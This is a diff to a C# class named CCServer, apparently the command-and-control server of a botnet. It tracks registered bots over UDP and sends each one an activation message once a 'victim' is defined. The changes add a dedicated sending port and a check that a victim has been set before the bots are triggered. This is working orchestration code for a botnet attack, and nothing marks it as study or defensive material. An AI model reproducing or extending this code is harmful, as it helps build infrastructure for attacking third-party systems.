@@ -16,6 +16,7 @@ namespace CC
         static readonly int MAX_SIZE = 256;
         private UdpClient _udpclient;
         private int _listen_port;
+        private int _sending_port;
         private string _ip;
         private IPEndPoint _server_end_point;
         private bool _done;
@@ -27,12 +28,21 @@ namespace CC
         public CCServer(int listen_port, string ip)
         {
             _listen_port = listen_port;
+            _sending_port = find_free_port();
             _ip = ip;
             _udpclient = new UdpClient(_listen_port);
             _server_end_point = new IPEndPoint(IPAddress.Any, _listen_port);
             _bots = new List<Bot>();
-            //UdpClient uclient = new UdpClient();
         }
+
+        public int find_free_port()
+        {
+            UdpClient client_for_port = new UdpClient(0);
+            int port = ((IPEndPoint)client_for_port.Client.LocalEndPoint).Port;
+            client_for_port.Close();
+            return port;
+        }
+
         public void serve()
         {
             Thread t1 = new Thread(listen);
@@ -79,14 +89,20 @@ namespace CC
 
         private void activate()
         {
-            foreach (Bot bot in _bots) {
-                UdpClient client = new UdpClient();
-                IPEndPoint end_point = new IPEndPoint(IPAddress.Any, bot.get_port());
-                byte[] data = generate_activate_msg(bot);
-                client.Client.Bind(end_point);
-                client.Send(data, data.Length, bot.get_ip().ToString(), bot.get_port());
-                client.Close();
+            if (_victim != null)
+            {
+                foreach (Bot bot in _bots)
+                {
+                    UdpClient client = new UdpClient();
+                    IPEndPoint end_point = new IPEndPoint(IPAddress.Any, _sending_port);
+                    byte[] data = generate_activate_msg(bot);
+                    client.Client.Bind(end_point);
+                    client.Send(data, data.Length, bot.get_ip().ToString(), bot.get_port());
+                    client.Close();
+                }
             }
+            else
+                Console.WriteLine("victim undefined!!");
         }
 
         private byte[] generate_activate_msg(Bot bot)
